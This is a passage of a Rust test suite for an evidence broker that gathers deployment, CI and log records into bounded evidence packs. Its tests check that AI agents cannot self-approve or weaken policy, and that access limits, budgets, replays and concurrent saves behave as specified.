    let agent = Actor::new("agent-1", ActorKind::Agent);
    let log = result
        .pack
        .evidence
        .iter()
        .find(|evidence| evidence.evidence_type == EvidenceType::RuntimeLog)
        .unwrap()
        .evidence_id
        .clone();
    let observed = Proposal {
        target_ref: TargetRef {
            kind: TargetKind::Zone,
            id: "refunds".into(),
            version: Some("v3".into()),
        },
        episode_id: result.pack.episode_id.clone(),
        contribution_type: ContributionType::Observation,
        namespace: Namespace::Observed,
        content: json!({"observation": "the worker crashes"}),
        evidence_refs: vec![log.clone()],
        locality: Locality::Reusable,
        valid_until: None,
    };
    assert_eq!(
        broker
            .store
            .propose(&agent, observed.clone(), 1)
            .unwrap_err()
            .code,
        ErrorCode::Unauthorized
    );
    let approved = Proposal {
        namespace: Namespace::HumanApproved,
        ..observed.clone()
    };
    assert_eq!(
        broker.store.propose(&agent, approved, 1).unwrap_err().code,
        ErrorCode::Unauthorized
    );
    let unsupported = Proposal {
        namespace: Namespace::AgentProposed,
        evidence_refs: vec!["evd_missing".into()],
        ..observed.clone()
    };
    assert_eq!(
        broker
            .store
            .propose(&agent, unsupported, 1)
            .unwrap_err()
            .code,
        ErrorCode::EvidenceRequired
    );
    let id = broker
        .store
        .propose(
            &agent,
            Proposal {
                namespace: Namespace::AgentProposed,
                ..observed
            },
            1,
        )
        .unwrap();
    assert_eq!(
        broker.store.contributions.contributions[&id].status,
        ContributionStatus::Proposed
    );
    let guess = hypothesis(
        &agent,
        Claim {
            subject: entity_id(EntityKind::Deployment, "dep-7731"),
            subject_kind: EntityKind::Deployment,
            subject_key: "dep-7731".into(),
            predicate: "root_cause".into(),
            object: json!("missing column"),
        },
        "the column is missing",
        vec![log],
        None,
        3,
    );
    assert_eq!(
        (guess.status, guess.derivation.method),
        (AssertionStatus::Proposed, DerivationMethod::AgentHypothesis)
    );
}

/** 17. Self-approval, approval by agents, and policy weakening are refused; accepted constraints
 * still require Crane's workflow and hypotheses never become observations
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn refuses_self_approval_and_policy_weakening() {
    let (mut broker, result) = investigate(&demo::scenario().unwrap());
    let scenario = demo::scenario().unwrap();
    let reviewer = demo::engineer(&scenario);
    let author = AccessPolicy {
        actor: Actor::new("dev@acme.example", ActorKind::Human),
        ..reviewer.clone()
    };
    let deployment = result
        .pack
        .evidence
        .iter()
        .find(|evidence| evidence.evidence_type == EvidenceType::Deployment)
        .unwrap()
        .evidence_id
        .clone();
    let proposal = |kind: ContributionType, namespace: Namespace, content: Value| Proposal {
        target_ref: TargetRef {
            kind: TargetKind::Zone,
            id: "refunds".into(),
            version: Some("v3".into()),
        },
        episode_id: None,
        contribution_type: kind,
        namespace,
        content,
        evidence_refs: vec![deployment.clone()],
        locality: Locality::Reusable,
        valid_until: Some(10_000),
    };
    let observation = broker
        .store
        .propose(
            &author.actor,
            proposal(
                ContributionType::Observation,
                Namespace::Observed,
                json!({"observation": "deploys of this zone need a backfill"}),
            ),
            1,
        )
        .unwrap();
    assert_eq!(
        broker
            .store
            .review(
                &author,
                &observation,
                ContributionStatus::Accepted,
                "mine",
                2
            )
            .unwrap_err()
            .code,
        ErrorCode::SelfApproval
    );
    let agent = AccessPolicy {
        actor: Actor::new("agent-1", ActorKind::Agent),
        may_review: true,
        ..reviewer.clone()
    };
    assert_eq!(
        broker
            .store
            .review(
                &agent,
                &observation,
                ContributionStatus::Accepted,
                "lgtm",
                2
            )
            .unwrap_err()
            .code,
        ErrorCode::Unauthorized
    );
    let agent_actor = agent.actor.clone();
    let weaken = proposal(
        ContributionType::ConstraintProposal,
        Namespace::AgentProposed,
        json!({"effect": "relax", "policy": "refund_safety"}),
    );
    assert_eq!(
        broker
            .store
            .propose(&agent_actor, weaken, 3)
            .unwrap_err()
            .code,
        ErrorCode::PolicyChange
    );
    let tighten = broker.store.propose(&agent_actor, proposal(ContributionType::ConstraintProposal, Namespace::AgentProposed, json!({"effect": "tighten", "policy": "refund_safety", "rule": "require a backfill check"})), 3).unwrap();
    broker
        .store
        .review(
            &reviewer,
            &tighten,
            ContributionStatus::Accepted,
            "agreed",
            4,
        )
        .unwrap();
    let accepted = &broker.store.contributions.contributions[&tighten];
    assert!(accepted.requires_crane_workflow);
    assert_eq!(
        (accepted.status, accepted.namespace),
        (ContributionStatus::Accepted, Namespace::HumanApproved)
    );
    let guess = broker
        .store
        .propose(
            &agent_actor,
            proposal(
                ContributionType::Hypothesis,
                Namespace::AgentProposed,
                json!({"hypothesis": "old jobs lack keys"}),
            ),
            5,
        )
        .unwrap();
    broker
        .store
        .review(
            &reviewer,
            &guess,
            ContributionStatus::Accepted,
            "plausible",
            6,
        )
        .unwrap();
    let reviewed = &broker.store.contributions.contributions[&guess];
    assert_eq!(
        (reviewed.contribution_type, reviewed.namespace),
        (ContributionType::Hypothesis, Namespace::HumanApproved)
    );
    assert_eq!(
        broker
            .store
            .review(&reviewer, &guess, ContributionStatus::Rejected, "again", 7)
            .unwrap_err()
            .code,
        ErrorCode::InvalidTransition
    );
    assert!(!transition_allowed(
        ContributionStatus::Rejected,
        ContributionStatus::Accepted
    ));
    let newer = broker
        .store
        .propose(
            &author.actor,
            proposal(
                ContributionType::Observation,
                Namespace::Observed,
                json!({"observation": "a newer note"}),
            ),
            8,
        )
        .unwrap();
    broker
        .store
        .contributions
        .supersede(&author, &observation, &newer)
        .unwrap();
    assert_eq!(
        broker.store.contributions.contributions[&observation].status,
        ContributionStatus::Superseded
    );
    assert_eq!(broker.store.contributions.expire(20_000), 3);
}

/** 18. The Evidence Pack is bounded, has a complete manifest, and warns about missing evidence
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn builds_bounded_packs_with_manifests() {
    let (_, result) = investigate(&demo::scenario().unwrap());
    let pack = &result.pack;
    assert_eq!(pack.status, InvestigationStatus::Incomplete);
    let expected = pack.evidence.len() * 2
        + pack.entities.len()
        + pack.context_view.relations.len()
        + pack.assertions.len()
        + pack.contributions.task_local.len()
        + pack.contributions.reusable.len();
    assert_eq!(pack.manifest.entries.len(), expected);
    assert!(!pack.manifest.digest.is_empty() && pack.pack_id.starts_with("pck_"));
    assert!(pack.size_bytes <= pack.limits.max_bytes);
    let completeness = pack
        .warnings
        .iter()
        .filter(|warning| warning.kind == WarningKind::Completeness)
        .count();
    assert!(completeness >= 2, "test report and metrics are missing");
    let states = pack
        .sources
        .iter()
        .map(|source| source.state)
        .collect::<BTreeSet<_>>();
    for state in [
        SourceState::Collected,
        SourceState::Empty,
        SourceState::Unavailable,
        SourceState::NotQueried,
    ] {
        assert!(states.contains(&state), "{state:?} is reported");
    }
    let scenario = demo::scenario().unwrap();
    let mut small = demo::request(&scenario);
    small.pack_limits.max_records = 3;
    small.pack_limits.max_excerpt_chars = 40;
    let mut broker = broker(&scenario);
    let bounded = broker
        .investigate(small, &demo::engineer(&scenario))
        .unwrap()
        .pack;
    assert_eq!(bounded.evidence.len(), 3);
    assert!(bounded
        .evidence
        .iter()
        .all(|evidence| evidence.excerpt.to_string().len() < 200));
    let mut tiny = demo::request(&scenario);
    tiny.pack_limits.max_bytes = 30_000;
    let truncated = broker
        .investigate(tiny, &demo::engineer(&scenario))
        .unwrap()
        .pack;
    assert!(truncated
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Truncation));
}

/** 19. Task-local context stays separate from reusable zone and flow context, and inclusion in a
 * pack publishes nothing
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn separates_task_local_and_reusable_context() {
    let scenario = demo::scenario().unwrap();
    let (mut broker, first) = investigate(&scenario);
    let episode = first.pack.episode_id.clone().unwrap();
    let agent = Actor::new("agent-1", ActorKind::Agent);
    let base = Proposal {
        target_ref: TargetRef {
            kind: TargetKind::WorkEpisode,
            id: episode.clone(),
            version: None,
        },
        episode_id: Some(episode.clone()),
        contribution_type: ContributionType::Summary,
        namespace: Namespace::AgentProposed,
        content: json!({"summary": "deployment failed on old jobs"}),
        evidence_refs: Vec::new(),
        locality: Locality::TaskLocal,
        valid_until: None,
    };
    broker.store.propose(&agent, base.clone(), 1).unwrap();
    assert!(broker
        .store
        .propose(
            &agent,
            Proposal {
                locality: Locality::Reusable,
                ..base.clone()
            },
            1
        )
        .is_err());
    let zone = Proposal {
        target_ref: TargetRef {
            kind: TargetKind::Zone,
            id: "refunds".into(),
            version: Some("v3".into()),
        },
        locality: Locality::Reusable,
        ..base
    };
    broker.store.propose(&agent, zone, 2).unwrap();
    let second = broker
        .investigate(demo::request(&scenario), &demo::engineer(&scenario))
        .unwrap();
    let contributions = &second.pack.contributions;
    assert_eq!(contributions.task_local.len(), 1);
    assert_eq!(contributions.reusable.len(), 1);
    assert_eq!(contributions.reusable[0].target_ref.id, "refunds");
    assert!(contributions
        .task_local
        .iter()
        .chain(contributions.reusable.iter())
        .all(|contribution| contribution.status == ContributionStatus::Proposed));
    let zone_entity = second
        .pack
        .entities
        .iter()
        .find(|entity| entity.entity_id == entity_id(EntityKind::Zone, "refunds"))
        .unwrap();
    assert_eq!(zone_entity.version.as_deref(), Some("v3"));
}

/** 20. Query budgets are enforced and their exhaustion is explicit
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn enforces_query_budgets() {
    let scenario = demo::scenario().unwrap();
    let mut request = demo::request(&scenario);
    request.budget = Budget {
        max_steps: 4,
        ..Budget::default()
    };
    let (_, result) = {
        let mut broker = broker(&scenario);
        let result = broker
            .investigate(request, &demo::engineer(&scenario))
            .unwrap();
        (broker, result)
    };
    assert_eq!(result.pack.status, InvestigationStatus::BudgetExhausted);
    assert_eq!(result.audit.stop_reason, StopReason::BudgetExhausted);
    assert_eq!(result.audit.usage.steps, 4);
    assert!(result
        .audit
        .steps
        .iter()
        .any(|step| step.state == StepState::BudgetExhausted));
    assert!(result
        .pack
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Budget));
    assert!(result.audit.metrics.budget_exhausted >= 1);
    let mut records = demo::request(&scenario);
    records.budget = Budget {
        max_records: 3,
        ..Budget::default()
    };
    let limited = broker(&scenario)
        .investigate(records, &demo::engineer(&scenario))
        .unwrap();
    assert_eq!(limited.audit.usage.records, 3);
    assert_eq!(limited.pack.status, InvestigationStatus::BudgetExhausted);
}

/** 21. A replay against unchanged sources is exact; after a source changes it is reported as
 * diverged, distinct from a fresh query, and the changed record supersedes the old one
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn distinguishes_replays_from_fresh_queries() {
    let mut scenario = demo::scenario().unwrap();
    let (mut broker, original) = investigate(&scenario);
    let policy = demo::engineer(&scenario);
    let same = broker.replay(&original.audit.query_id, &policy).unwrap();
    assert_eq!(
        same.audit.mode,
        ExecutionMode::Replay {
            of_query: original.audit.query_id.clone()
        }
    );
    assert_eq!(
        same.audit.replay.as_ref().unwrap().fidelity,
        ReplayFidelity::Exact
    );
    assert_eq!(same.pack.retrieval.mode, same.audit.mode);
    assert_eq!(original.audit.mode, ExecutionMode::Fresh);
    let deploy = resource(&mut scenario, "deploy");
    deploy.records[0].content["status"] = json!("rolled_back");
    deploy.records[0].source_revision = Some("dep-7731-v3".into());
    broker.connectors.insert(
        "deploy".into(),
        Box::new(FixtureConnector::new(deploy.records.clone())),
    );
    let changed = broker.replay(&original.audit.query_id, &policy).unwrap();
    let comparison = changed.audit.replay.clone().unwrap();
    assert_eq!(comparison.fidelity, ReplayFidelity::Diverged);
    assert!(comparison
        .differences
        .iter()
        .any(|difference| difference.starts_with("deployment@deploy")));
    let newest = changed
        .pack
        .evidence
        .iter()
        .find(|evidence| evidence.evidence_type == EvidenceType::Deployment)
        .unwrap();
    assert!(broker.store.evidence[&newest.evidence_id]
        .supersedes
        .is_some());
    assert_eq!(
        broker.store.audit(&changed.audit.query_id).unwrap().replay,
        Some(comparison)
    );
    assert!(broker.replay("qry_unknown", &policy).is_err());
}

/** 22. Work Capture adds no dependency on the excluded product (named in the specification),
 * no new crate, and no new infrastructure
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn introduces_no_soil_or_new_infrastructure() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
    let mut pending = vec![root.join("src")];
    let mut files = vec![root.join("Cargo.toml")];
    while let Some(directory) = pending.pop() {
        for entry in std::fs::read_dir(directory).unwrap().flatten() {
            let path = entry.path();
            if path.is_dir() {
                pending.push(path);
            } else {
                files.push(path);
            }
        }
    }
    let excluded = ["so", "il"].concat();
    for file in &files {
        let text = std::fs::read_to_string(file)
            .unwrap_or_default()
            .to_ascii_lowercase();
        let words = text
            .split(|character: char| !character.is_ascii_alphanumeric() && character != '_')
            .collect::<BTreeSet<_>>();
        assert!(
            !words.contains(excluded.as_str()),
            "{} references the excluded product",
            file.display()
        );
        if file.starts_with(root.join("src").join("capture"))
            && file.file_name().is_some_and(|name| name != "tests.rs")
        {
            assert!(
                !text.contains("mongodb") && !text.contains("crate::server"),
                "{} reaches the hosted service",
                file.display()
            );
        }
    }
    let manifest = std::fs::read_to_string(root.join("Cargo.toml")).unwrap();
    let dependencies = manifest
        .split("[dependencies]")
        .nth(1)
        .unwrap()
        .split("\n[")
        .next()
        .unwrap();
    let names = dependencies
        .lines()
        .filter_map(|line| {
            line.split_once('=')
                .map(|(name, _)| name.trim().to_string())
        })
        .filter(|name| !name.starts_with('#'))
        .collect::<BTreeSet<_>>();
    let expected = [
        "serde",
        "serde_json",
        "serde_yaml",
        "sha2",
        "ed25519-dalek",
        "getrandom",
        "rpassword",
        "argon2",
        "chacha20poly1305",
        "ureq",
        "tiny_http",
        "mongodb",
    ]
    .iter()
    .map(|name| name.to_string())
    .collect::<BTreeSet<_>>();
    assert_eq!(names, expected);
}

/** The end-to-end demonstration: a bounded, incomplete pack with honest uncertainty, a proposed
 * hypothesis, an exact replay, feedback, and an outcome recorded with evidence
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn runs_the_end_to_end_demonstration() {
    let report = demo::run().unwrap();
    assert_eq!(report.pack.status, InvestigationStatus::Incomplete);
    assert_eq!(report.pack.scope.zones[0].version.as_deref(), Some("v3"));
    assert_eq!(report.pack.scope.flows[0].version.as_deref(), Some("v2"));
    assert!(report
        .pack
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Uncertainty));
    assert_eq!(
        report.replay.as_ref().unwrap().fidelity,
        ReplayFidelity::Exact
    );
    let episode = report.episode.unwrap();
    assert_eq!(episode.outcome, Some(EpisodeOutcome::Failed));
    assert_eq!(episode.feedback[0].sufficient, Truth::No);
    assert_eq!(
        serde_json::to_string(&demo::run().unwrap().pack).unwrap(),
        serde_json::to_string(&report.pack).unwrap(),
        "the demonstration is deterministic"
    );
    let mut untracked = WorkEpisode::open(None, "spike", 1);
    assert_eq!(
        untracked
            .record_outcome(
                &Actor::new("agent", ActorKind::Agent),
                false,
                EpisodeOutcome::Succeeded,
                Vec::new(),
                2
            )
            .unwrap_err()
            .code,
        ErrorCode::EvidenceRequired
    );
    let question = Question {
        question_id: "q1".into(),
        text: "Did tests run against old jobs?".into(),
        target: TargetRef {
            kind: TargetKind::WorkEpisode,
            id: episode.episode_id.clone(),
            version: None,
        },
        reason: "tests_passed is unknown".into(),
        relevant_evidence: Vec::new(),
        required_evidence: vec![EvidenceType::TestReport],
        permitted_resources: vec!["ci".into()],
        recipe: None,
        state: QuestionState::Open,
        asked_by: Actor::new("agent", ActorKind::Agent),
        answer_pack: None,
        created_at: 1,
    };
    let scenario = demo::scenario().unwrap();
    let mut routed = question
        .to_request(
            Some(&episode.episode_id),
            Some("PAY-142"),
            demo::request(&scenario).known,
            Budget::default(),
        )
        .unwrap();
    routed.plan = Some(vec![RecipeStep {
        mandatory: false,
        step_id: "tests".into(),
        description: "test reports".into(),
        resource_type: crate::capture::resources::registry::ResourceType::Ci,
        operation: crate::capture::resources::registry::Operation::Query,
        evidence_type: EvidenceType::TestReport,
        record: None,
        filters: [("commit".to_string(), "{commit}".to_string())]
            .into_iter()
            .collect(),
        limit: 10,
        when: Predicate::Always,
    }]);
    let answer = broker(&scenario)
        .investigate(routed, &demo::engineer(&scenario))
        .unwrap();
    assert!(answer.audit.recipe.unwrap().recipe_id.starts_with("plan-"));
    assert!(answer.audit.steps.iter().all(|step| step
        .resource_id
        .as_deref()
        .is_none_or(|resource| resource == "ci" || resource == "landscape")));
    assert!(answer
        .pack
        .missing_evidence
        .iter()
        .any(|missing| missing.evidence_type == EvidenceType::TestReport));
    let mut bad_plan = demo::request(&scenario);
    bad_plan.plan = Some(vec![RecipeStep {
        record: Some("{password}".into()),
        operation: crate::capture::resources::registry::Operation::Fetch,
        ..failed_deployment().steps[0].clone()
    }]);
    assert_eq!(
        broker(&scenario)
            .investigate(bad_plan, &demo::engineer(&scenario))
            .unwrap_err()
            .code,
        ErrorCode::InvalidRecipe
    );
}

/** The store persists every collection and refuses a newer layout
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn persists_and_migrates_the_store() {
    let directory = tempfile::tempdir().unwrap();
    let scenario = demo::scenario().unwrap();
    let mut broker = demo::broker(&scenario, Clock::fixed(demo::DEMO_EPOCH)).unwrap();
    broker.store = CaptureStore::open(directory.path()).unwrap();
    let result = broker
        .investigate(demo::request(&scenario), &demo::engineer(&scenario))
        .unwrap();
    broker.store.save().unwrap();
    let reopened = CaptureStore::open(directory.path()).unwrap();
    assert_eq!(reopened.evidence.len(), broker.store.evidence.len());
    assert_eq!(
        reopened.graph.relations.len(),
        broker.store.graph.relations.len()
    );
    assert_eq!(reopened.packs[&result.pack.pack_id], result.pack);
    assert_eq!(
        reopened.audit(&result.audit.query_id).unwrap(),
        &result.audit
    );
    assert_eq!(
        reopened
            .evidence_of_type(EvidenceType::Deployment, 10)
            .len(),
        1
    );
    std::fs::write(
        directory.path().join("state.json"),
        r#"{"schema_version": 99, "deliveries": {}, "cursors": {}}"#,
    )
    .unwrap();
    assert_eq!(
        CaptureStore::open(directory.path()).unwrap_err().code,
        ErrorCode::SchemaVersion
    );
}

/** Collect every evidence id a pack refers to outside its own evidence list: assertion support and
 * contradiction, learned scope facts, the context view, its relations' provenance, entities' first
 * evidence, and warning references that name evidence
 * Input
    - pack: &super::ingest::pack::EvidencePack - pack
 * Output
    - BTreeSet<String>
*/
fn referenced_evidence(pack: &super::ingest::pack::EvidencePack) -> BTreeSet<String> {
    let mut ids = BTreeSet::new();
    for assertion in &pack.assertions {
        ids.extend(assertion.supporting.iter().cloned());
        ids.extend(assertion.contradicting.iter().cloned());
    }
    ids.extend(
        pack.scope
            .learned
            .iter()
            .map(|fact| fact.evidence_id.clone()),
    );
    ids.extend(pack.context_view.evidence.iter().cloned());
    for relation in &pack.context_view.relations {
        ids.extend(relation.provenance.evidence.iter().cloned());
    }
    ids.extend(
        pack.entities
            .iter()
            .filter_map(|entity| entity.first_evidence.clone()),
    );
    for warning in &pack.warnings {
        ids.extend(
            warning
                .refs
                .iter()
                .filter(|reference| reference.starts_with("evd_"))
                .cloned(),
        );
    }
    ids
}

/** Assert a pack refers only to evidence it holds
 * Input
    - pack: &super::ingest::pack::EvidencePack - pack
    - label: &str - which case, for the failure message
 * Output
    - None (panics on failure)
*/
fn assert_pack_is_closed(pack: &super::ingest::pack::EvidencePack, label: &str) {
    let mut held = pack
        .evidence
        .iter()
        .map(|evidence| evidence.evidence_id.clone())
        .collect::<BTreeSet<_>>();
    // Evidence left out to keep the pack within its size is named by the truncation warning, so
    // a reference to it is declared, not leaked; the view itself must still hold only pack evidence
    for evidence in &pack.context_view.evidence {
        assert!(
            held.contains(evidence),
            "{label}: the context view lists evidence the pack does not hold: {evidence}"
        );
    }
    held.extend(
        pack.warnings
            .iter()
            .filter(|warning| warning.kind == WarningKind::Truncation)
            .flat_map(|warning| warning.refs.iter().cloned()),
    );
    let outside = referenced_evidence(pack)
        .difference(&held)
        .cloned()
        .collect::<Vec<_>>();
    assert!(
        outside.is_empty(),
        "{label}: the pack refers to evidence it does not hold: {outside:?}"
    );
}

/** 23. A record the actor may not receive is never learned from, linked, or concluded from: a
 * staging-only contractor who does not name an environment learns nothing about production
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn contractor_cannot_learn_forbidden_scope() {
    let scenario = demo::scenario().unwrap();
    let mut policy = demo::engineer(&scenario);
    policy.actor = Actor::new("contractor@partner.example", ActorKind::Human);
    policy.environments = BTreeSet::from(["staging".to_string()]);
    policy.resources.remove("logs");
    let mut broker = broker(&scenario);
    let result = broker
        .investigate(demo::request(&scenario), &policy)
        .unwrap();
    let text = serde_json::to_string(&result.pack).unwrap();
    assert!(
        !text.contains("production"),
        "the pack reveals the forbidden environment"
    );
    assert!(result
        .pack
        .assertions
        .iter()
        .all(|assertion| assertion.claim.subject_key != "dep-7731"));
    assert_eq!(result.pack.scope.environment, None);
    assert_eq!(result.audit.stop_reason, StopReason::Rejected);
    assert_eq!(result.pack.status, InvestigationStatus::Rejected);
    assert!(result
        .audit
        .steps
        .iter()
        .filter(|step| step.step_id == "deploy-logs" || step.step_id == "verification")
        .all(|step| step.state == StepState::Denied && step.connector_status.is_none()));
    assert!(result
        .pack
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Access
            && warning.refs.is_empty()
            && warning.message.contains("withheld")));
    assert_pack_is_closed(&result.pack, "contractor");
}

/** 24. A record above the actor's sensitivity ceiling is withheld before anything uses it
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn sensitivity_ceiling_blocks_learning() {
    let scenario = demo::scenario().unwrap();
    let mut policy = demo::engineer(&scenario);
    policy.max_sensitivity = Sensitivity::Internal;
    let mut broker = broker(&scenario);
    let result = broker
        .investigate(demo::request(&scenario), &policy)
        .unwrap();
    assert!(result
        .pack
        .evidence
        .iter()
        .all(|evidence| evidence.evidence_type != EvidenceType::RuntimeLog));
    assert!(!serde_json::to_string(&result.pack)
        .unwrap()
        .contains("idempotency_key' while processing"));
    assert_pack_is_closed(&result.pack, "internal ceiling");
}

/** 25. Class guard: under every restricted policy, every evidence id a pack refers to is evidence
 * the pack holds, so no consumer can use a record before its authorization check
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn packs_refer_only_to_evidence_they_hold() {
    let scenario = demo::scenario().unwrap();
    let full = demo::engineer(&scenario);
    let mut staging = full.clone();
    staging.environments = BTreeSet::from(["staging".to_string()]);
    let mut no_logs = full.clone();
    no_logs.resources.remove("logs");
    let mut no_deployments = full.clone();
    no_deployments.evidence_types = Some(
        [
            EvidenceType::Task,
            EvidenceType::PullRequest,
            EvidenceType::CodeChange,
            EvidenceType::CiRun,
            EvidenceType::TestReport,
            EvidenceType::ToolCall,
            EvidenceType::GraphState,
            EvidenceType::Policy,
        ]
        .into_iter()
        .collect(),
    );
    let mut internal = full.clone();
    internal.max_sensitivity = Sensitivity::Internal;
    let conflicting = scenario_with(|scenario| {
        let deploy = resource(scenario, "deploy");
        let mut canary = deploy.records[1].clone();
        canary.record_id = "check-canary-7731".into();
        canary.content = json!({"deployment": "dep-7731", "check": "canary", "healthy": true, "environment": "production"});
        deploy.records.push(canary);
    });
    for (label, policy) in [
        ("full", &full),
        ("staging", &staging),
        ("no logs", &no_logs),
        ("no deployments", &no_deployments),
        ("internal", &internal),
    ] {
        for (case, scenario) in [("demo", &scenario), ("conflicting", &conflicting)] {
            let mut broker = broker(scenario);
            let result = broker.investigate(demo::request(scenario), policy).unwrap();
            assert_pack_is_closed(&result.pack, &format!("{label} / {case}"));
        }
    }
    // Evidence another actor's investigation linked into the shared graph stays out of a
    // restricted actor's view
    let mut broker = broker(&scenario);
    broker.investigate(demo::request(&scenario), &full).unwrap();
    let restricted = broker
        .investigate(demo::request(&scenario), &staging)
        .unwrap();
    assert_pack_is_closed(&restricted.pack, "shared graph");
    assert!(!serde_json::to_string(&restricted.pack)
        .unwrap()
        .contains("production"));
}

/** 26. Two stores opened on one directory both save: neither loses what the other captured
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn concurrent_saves_keep_both() {
    let directory = tempfile::tempdir().unwrap();
    let first_scenario = demo::scenario().unwrap();
    let second_scenario = scenario_with(|scenario| {
        resource(scenario, "ci").records.push(record(
            "tests-5521",
            EvidenceType::TestReport,
            json!({"commit": "9f1c2ab7d4", "passed": 41, "failed": 0, "repository": "acme/payments"}),
            Some(1_759_994_100_000),
        ));
        let ci = resource(scenario, "ci");
        let last = ci.records.len() - 1;
        ci.records[last].metadata = [("commit".to_string(), "9f1c2ab7d4".to_string())]
            .into_iter()
            .collect();
    });
    let mut first = broker(&first_scenario);
    first.store = CaptureStore::open(directory.path()).unwrap();
    let mut second = broker(&second_scenario);
    second.store = CaptureStore::open(directory.path()).unwrap();
    let one = first
        .investigate(
            demo::request(&first_scenario),
            &demo::engineer(&first_scenario),
        )
        .unwrap();
    let mut other_request = demo::request(&second_scenario);
    other_request.question = "Did the refund tests run?".into();
    let two = second
        .investigate(other_request, &demo::engineer(&second_scenario))
        .unwrap();
    first.store.save().unwrap();
    second.store.save().unwrap();
    let reopened = CaptureStore::open(directory.path()).unwrap();
    assert!(reopened.audit(&one.audit.query_id).is_some());
    assert!(reopened.audit(&two.audit.query_id).is_some());
    assert!(reopened.packs.contains_key(&one.pack.pack_id));
    assert!(reopened.packs.contains_key(&two.pack.pack_id));
    for id in first
        .store
        .evidence
        .keys()
        .chain(second.store.evidence.keys())
    {
        assert!(reopened.evidence.contains_key(id), "evidence {id} was lost");
    }
    assert!(reopened
        .evidence
        .values()
        .any(|record| record.evidence_type == EvidenceType::TestReport));
    for pack in reopened.packs.values() {
        pack.verify_manifest().unwrap();
    }
}

/** 27. A contribution accepted by one store is not reverted to proposed by another store's save
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn contribution_status_never_regresses_on_merge() {
    let directory = tempfile::tempdir().unwrap();
    let scenario = demo::scenario().unwrap();
    let engineer = demo::engineer(&scenario);
    let mut first = broker(&scenario);
    first.store = CaptureStore::open(directory.path()).unwrap();
    let result = first
        .investigate(demo::request(&scenario), &engineer)
        .unwrap();
    let agent = Actor::new("claude@ses_demo01", ActorKind::Agent);
    let id = first
        .store
        .propose(
            &agent,
            Proposal {
                target_ref: TargetRef {
                    kind: TargetKind::Zone,
                    id: "refunds".into(),
                    version: result.pack.scope.zones[0].version.clone(),
                },
                episode_id: result.pack.episode_id.clone(),
                contribution_type: ContributionType::Hypothesis,
                namespace: Namespace::AgentProposed,
                content: json!({"hypothesis": "queued jobs lack the key"}),
                evidence_refs: Vec::new(),
                locality: Locality::Reusable,
                valid_until: None,
            },
            demo::DEMO_EPOCH + 10_000,
        )
        .unwrap();
    first.store.save().unwrap();
    let second = CaptureStore::open(directory.path()).unwrap();
    first
        .store
        .review(
            &engineer,
            &id,
            ContributionStatus::Accepted,
            "confirmed",
            demo::DEMO_EPOCH + 20_000,
        )
        .unwrap();
    first.store.save().unwrap();
    second.save().unwrap();
    let reopened = CaptureStore::open(directory.path()).unwrap();
    assert_eq!(
        reopened.contributions.contributions[&id].status,
        ContributionStatus::Accepted
    );
}

/** 28. Class guard: several investigations saving to one store at the same time lose nothing
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn parallel_investigations_lose_nothing() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().to_path_buf();
    let workers = (0..4)
        .map(|worker| {
            let path = path.clone();
            std::thread::spawn(move || {
                let scenario = demo::scenario().unwrap();
                let mut broker = demo::broker(&scenario, Clock::fixed(demo::DEMO_EPOCH)).unwrap();
                broker.store = CaptureStore::open(&path).unwrap();
                let mut request = demo::request(&scenario);
                request.question = format!("worker {worker}: why did the deployment fail?");
                let result = broker
                    .investigate(request, &demo::engineer(&scenario))
                    .unwrap();
                broker.store.save().unwrap();
                result.audit.query_id
            })
        })
        .collect::<Vec<_>>();
    let ids = workers
        .into_iter()
        .map(|worker| worker.join().unwrap())
        .collect::<Vec<_>>();
    let reopened = CaptureStore::open(&path).unwrap();
    for id in &ids {
        assert!(reopened.audit(id).is_some(), "audit {id} was lost");
    }
    assert_eq!(reopened.audits.len(), ids.len());
    for pack in reopened.packs.values() {
        pack.verify_manifest().unwrap();
    }
}

/** A context proposal for the scenario's zone, by the scenario's agent
 * Input
    - result: &crate::capture::broker::run::EvidenceQueryResult - the investigation it follows
    - zone: &str - zone id
    - version: Option<&str> - version the proposer names
    - namespace: Namespace - namespace claimed
 * Output
    - Proposal
*/
fn zone_proposal(
    result: &crate::capture::broker::run::EvidenceQueryResult,
    zone: &str,
    version: Option<&str>,
    namespace: Namespace,
) -> Proposal {
    Proposal {
        target_ref: TargetRef {
            kind: TargetKind::Zone,
            id: zone.into(),
            version: version.map(str::to_string),
        },
        episode_id: result.pack.episode_id.clone(),
        contribution_type: ContributionType::Hypothesis,
        namespace,
        content: json!({"hypothesis": "queued jobs lack the key"}),
        evidence_refs: Vec::new(),
        locality: Locality::Reusable,
        valid_until: None,
    }
}

/** 29. A refused proposal leaves the graph exactly as it was
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn refused_proposal_leaves_graph_untouched() {
    let (mut broker, result) = investigate(&demo::scenario().unwrap());
    let entities = broker.store.graph.entities.clone();
    let relations = broker.store.graph.relations.clone();
    let agent = Actor::new("claude@ses_demo01", ActorKind::Agent);
    let refused = broker.store.propose(
        &agent,
        zone_proposal(&result, "refunds", Some("v99"), Namespace::Observed),
        demo::DEMO_EPOCH + 10_000,
    );
    assert_eq!(refused.unwrap_err().code, ErrorCode::Unauthorized);
    assert_eq!(broker.store.graph.entities, entities);
    assert_eq!(broker.store.graph.relations, relations);
    let unobserved = broker.store.propose(
        &agent,
        zone_proposal(&result, "ghost", Some("v1"), Namespace::AgentProposed),
